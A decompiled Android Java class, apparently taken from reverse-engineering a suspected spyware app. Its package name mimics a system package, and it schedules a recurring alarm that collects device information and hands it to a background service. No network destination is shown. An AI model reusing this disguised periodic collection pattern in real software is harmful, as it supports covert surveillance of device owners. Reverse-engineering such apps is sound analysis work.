package com.android.system;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.SystemClock;
import com.app.system.common.entity.DeviceInfo;
import com.app.system.common.service.EventsAndReceiveService;

public class SyncDeviceInfoReceiver
  extends BroadcastReceiver
{
  private static void a(Context paramContext)
  {
    PendingIntent localPendingIntent = PendingIntent.getBroadcast(paramContext, 0, new Intent(paramContext, SyncDeviceInfoReceiver.class), 134217728);
    localPendingIntent.cancel();
    ((AlarmManager)paramContext.getSystemService("alarm")).cancel(localPendingIntent);
  }
  
  public static void a(Context paramContext, boolean paramBoolean)
  {
    int i;
    if (paramBoolean) {
      i = 60;
    } else {
      i = 600;
    }
    Object localObject = new StringBuilder();
    ((StringBuilder)localObject).append("scheduleFirstAlarm: ");
    ((StringBuilder)localObject).append(i);
    ((StringBuilder)localObject).append(" sec.");
    com.security.d.a.d("SyncDeviceInfoReceiver", ((StringBuilder)localObject).toString(), new Object[0]);
    a(paramContext);
    localObject = PendingIntent.getBroadcast(paramContext, 0, new Intent(paramContext, SyncDeviceInfoReceiver.class), 0);
    ((AlarmManager)paramContext.getSystemService("alarm")).set(2, SystemClock.elapsedRealtime() + i * 1000, (PendingIntent)localObject);
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    com.security.d.a.d("SyncDeviceInfoReceiver", "ALARM received!", new Object[0]);
    Intent localIntent = new Intent(paramContext, EventsAndReceiveService.class);
    paramIntent = DeviceInfo.a();
    if (paramIntent != null) {
      paramIntent.b(paramContext);
    }
    localIntent.putExtra("event_core_app", "event_sync_device_info");
    com.b.a.a.a.a(paramContext, localIntent);
    a(paramContext, false);
  }
}


/* Location:              ~/com/android/system/SyncDeviceInfoReceiver.class
 *
 * Reversed by:           J
 */